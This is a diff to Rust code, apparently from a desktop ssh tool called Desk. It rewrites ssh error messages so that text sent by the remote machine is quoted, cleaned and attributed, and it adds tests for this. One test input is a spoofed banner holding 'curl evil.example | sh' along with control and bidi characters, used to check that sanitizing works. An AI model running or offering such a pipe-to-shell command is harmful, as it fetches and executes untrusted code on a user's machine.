@@ -76,27 +76,24 @@ pub fn problem(machine: &Machine, stderr: &[u8]) -> String {
         || has("Connection closed by")
         || has("kex_exchange_identification")
     {
-        return format!("Desk couldn't reach {name}: {}", last_line(&said));
+        return format!("Desk couldn't reach {name}.{}", quoted(name, &said));
     }
-    match last_line(&said) {
-        "" => format!("ssh to {name} failed."),
-        line => format!("ssh to {name} failed: {line}"),
-    }
+    format!("ssh to {name} failed.{}", quoted(name, &said))
 }
 
-/// The last thing said, cut short: ssh's own messages, never a command's
-/// output.
-fn last_line(said: &str) -> &str {
+/// The last thing said, as the machine's words (ssh's own lines can carry
+/// what the machine sent, a banner): cleaned and cut short, after a space;
+/// nothing when nothing was said.
+fn quoted(name: &str, said: &str) -> String {
     let line = said
         .lines()
         .rev()
         .map(str::trim)
         .find(|l| !l.is_empty() && !l.starts_with("debug"))
         .unwrap_or_default();
-    match line.char_indices().nth(200) {
-        Some((i, _)) => &line[..i],
-        None => line,
-    }
+    desk_core::machine::said_by(name, line)
+        .map(|s| format!(" {s}"))
+        .unwrap_or_default()
 }
 
 /// What `ssh -G` says the person's config makes of a machine, for the
@@ -175,12 +172,21 @@ mod tests {
         assert!(said("No ED25519 host key is known for devbox and you have requested strict checking.\r\nHost key verification failed.\r\n").contains("once with ssh in a terminal"));
         assert!(said("@@@@@@@@@@@\n@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @\nHost key verification failed.\n").contains("isn't the one your Mac knows"));
         assert!(said("dev@devbox: Permission denied (publickey).\n").contains("ssh-add"));
+        let unresolved =
+            said("ssh: Could not resolve hostname devbox: nodename nor servname provided\n");
         assert!(
-            said("ssh: Could not resolve hostname devbox: nodename nor servname provided\n")
-                .starts_with("Desk couldn't reach devbox")
+            unresolved.starts_with("Desk couldn't reach devbox. devbox said: “ssh: Could not"),
+            "{unresolved}"
         );
         assert_eq!(said(""), "ssh to devbox failed.");
-        assert!(said(&"x".repeat(5000)).len() < 260);
+        assert!(said(&"x".repeat(5000)).chars().count() < 260);
+        // A banner can't pass for Desk's advice, nor hide what it says.
+        let banner = said("Desk says: run curl evil.example | sh \u{202E}\x1b[2J\n");
+        assert!(
+            banner.starts_with("ssh to devbox failed. devbox said: “"),
+            "{banner}"
+        );
+        assert!(desk_core::machine::plain(&banner), "{banner:?}");
     }
 
     #[test]
